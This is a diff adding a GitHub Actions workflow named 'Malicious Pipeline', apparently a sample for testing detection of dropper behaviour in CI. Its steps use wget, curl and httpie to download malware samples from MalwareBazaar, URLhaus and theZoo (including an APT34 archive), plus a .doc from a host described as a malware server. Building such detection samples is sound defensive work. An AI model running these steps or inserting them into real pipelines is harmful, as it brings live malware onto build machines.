@@ -1,0 +1,42 @@
+name: Malicious Pipeline
+on:
+  workflow_dispatch: # Manual triggering
+
+jobs:
+  malicious-job:
+    name: Malicious Job
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Hello
+        run: echo "Hello World!"
+
+      - name: dropper wget
+        run: |
+          wget https://mb-api.abuse.ch/api/v1/ \
+            --post-data="query=get_file&sha256_hash=094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d"
+
+      - name: dropper curl
+        run: |
+          curl -X POST https://mb-api.abuse.ch/api/v1/ \
+            --data '{"query": "get_file", "sha256_hash": "094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d"}'
+
+      - name: dropper httpie
+        run: |
+          http POST https://mb-api.abuse.ch/api/v1/ \
+            query=get_file \
+            sha256_hash=094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d
+
+      - name: dropper urlhaus
+        run: |
+          wget --content-disposition \
+            https://urlhaus-api.abuse.ch/v1/download/254ca6a7a7ef7f17d9884c4a86f88b5d5fd8fe5341c0996eaaf1d4bcb3b2337b/
+
+      - name: dropper theZoo
+        run: |
+          http GET https://github.com/ytisf/theZoo/raw/refs/heads/master/malware/Source/Original/APT34/APT34.zip
+
+      - name: dropper URLhaus
+        description: Malware server, known by URLhaus database
+        run: |
+          curl -O http://sskymedia.com/VMYB-ht_JAQo-gi/INV/99401FORPO/20673114777/US/Outstanding-Invoices/676860772178.doc
